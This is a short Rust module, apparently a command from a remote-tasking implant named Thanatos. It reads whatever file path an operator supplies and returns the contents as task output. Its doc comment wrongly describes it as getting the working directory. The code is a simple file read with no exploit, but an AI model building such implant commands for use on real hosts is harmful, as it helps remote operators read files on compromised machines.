//! Get the current working directory using the rust std library

use agent_utils::{
    errors::ThanatosError,
    msg::{PendingTask, TaskResults},
};
use serde::Deserialize;

#[derive(Deserialize)]
struct CatArgs {
    file: String,
}

/// Return the contents of the specified file
pub fn cat(task: PendingTask) -> Result<TaskResults, ThanatosError> {
    let params: CatArgs =
        serde_json::from_str(&task.parameters).map_err(|_| ThanatosError::JsonDecodeError)?;

    Ok(TaskResults {
        completed: true,
        user_output: Some(
            std::fs::read_to_string(params.file).map_err(|_| ThanatosError::os_error())?,
        ),
        ..Default::default()
    })
}
